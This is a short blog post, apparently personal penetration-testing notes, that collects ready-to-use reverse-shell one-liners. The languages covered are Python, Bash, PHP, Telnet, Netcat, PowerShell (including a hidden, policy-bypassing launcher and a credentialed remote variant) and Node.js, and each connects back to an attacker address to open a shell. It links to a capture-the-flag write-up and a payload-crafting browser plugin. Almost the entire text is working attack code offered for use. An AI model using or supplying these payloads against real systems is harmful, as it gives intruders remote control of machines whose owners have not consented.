---
description: >-
  Reverse Shells
title:  Reverse Shells              # Add title here
date: 2023-02-11 08:00:00 -0600                           # Change the date to match completion date
categories: [07 Persistence,  Reverse Shells]                     # Change Templates to Writeup
tags: [persistence, reverse shell]     # TAG names should always be lowercase; replace template with writeup, and add relevant tags
show_image_post: false                                    # Change this to true
#image: /assets/img/machine-0-infocard.png                # Add infocard image here for post preview image
---
### Python
```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.45.175",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

### Bash
```bash
/bin/bash -c 'bash -i >& /dev/tcp/<attacker_IP>/<attacker_PORT> 0>&1'
```

### PHP
```php
# Example 1
<?php system("bash -c 'bash -i >& /dev/tcp/10.10.14.3/443 0>&1'");?>
# Example 2
php -r '$sock=fsockopen(“<attacker_IP>”,<attacker_PORT>); exec(“/bin/sh -I
<&3 >&3 2>&3”);'
```
Example:
[Fulcrum](https://shuciran.github.io/posts/Fulcrum/#fnref:rev-shell-php)

### Telnet
```bash
telnet <attacker_IP> 4444 | /bin/bash | telnet <attacker_IP> 4445
```

### Netcat
```bash
nc <attacker_IP> <attacker_PORT> -e /bin/sh
```

### Netcat w/o “-e” option
```bash
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -I 2>&1 | nc <attacker_IP> <attacker_PORT> > /tmp/f
```

### Powershell

From a non-powershell cli, we can execute our reverse shell with this command:
```powershell
powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("10.10.16.3",2345);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```
If we are on a powershell cli, we can execute this one instead:
```powershell
Invoke-Command -ComputerName file.fulcrum.local -Credential $Creds -ScriptBlock { $client = New-Object System.Net.Sockets.TCPClient('10.10.16.3',53);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close() }
```

Examples:
[Fulcrum](https://shuciran.github.io/posts/Fulcrum/#fnref:rev-powershell)

### Node JS
```bash
(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("/bin/sh", []);
    var client = new net.Socket();
    client.connect(443, "10.10.14.2", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/; // Prevents the Node.js application from crashing
})();
```

### Firefox Plugin
An excellent plugin to craft different payloads as Reverse Shells directly from firefox:
[hacktools](https://addons.mozilla.org/es/firefox/addon/hacktools/)

